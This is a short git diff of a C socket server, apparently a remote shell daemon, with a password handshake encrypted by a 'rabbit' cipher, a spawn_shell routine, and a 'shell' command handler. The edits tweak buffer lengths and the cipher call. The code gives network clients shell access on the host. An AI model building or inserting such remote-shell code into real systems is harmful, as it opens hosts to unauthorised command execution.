@@ -171,16 +171,16 @@ int handle_connexions(int *master_sd, fd_set *readfds, int *clients_sockets)
 			close(*master_sd);
 			return -1;
 		}
-		send(clients_sockets[i], handshake, 16, 0);
+		send(clients_sockets[i], handshake, 17, 0);
 		// check password
-		if (read(clients_sockets[i], buffer, 16) < 0)
+		if (read(clients_sockets[i], buffer, 1025) < 0)
 		{
 			printf("error reading socket content\n");
 			close(*master_sd);
 			return -1;
 		}
 		buffer[16] = 0;
-		if (rabbit(handshake, KEY, IV))
+		if (rabbit(handshake, KEY))
 		{
 			printf("error encrypting handshake\n");
 			close(*master_sd);
@@ -220,6 +220,7 @@ int spawn_shell(int *clients_sockets)
 		// execve only return in case of trouble 
 		exit(EXIT_FAILURE);
 	}
+	send(*clients_sockets, "\n", 1, 0);
 	// parent fork again
 	int pid = fork();
 	if (pid < 0)
@@ -260,9 +261,9 @@ int handle_commands(fd_set *readfds, int *clients_sockets)
 			}
 			//Handle commands
 			else
-			{  
+			{
 				//set the string terminating NULL byte on the end of the data read 
-				buffer[valread] = '\0';
+				buffer[valread] = 0;
 				// handle shell command
 				if (strncmp(buffer, "shell", 5) == 0)
 				{
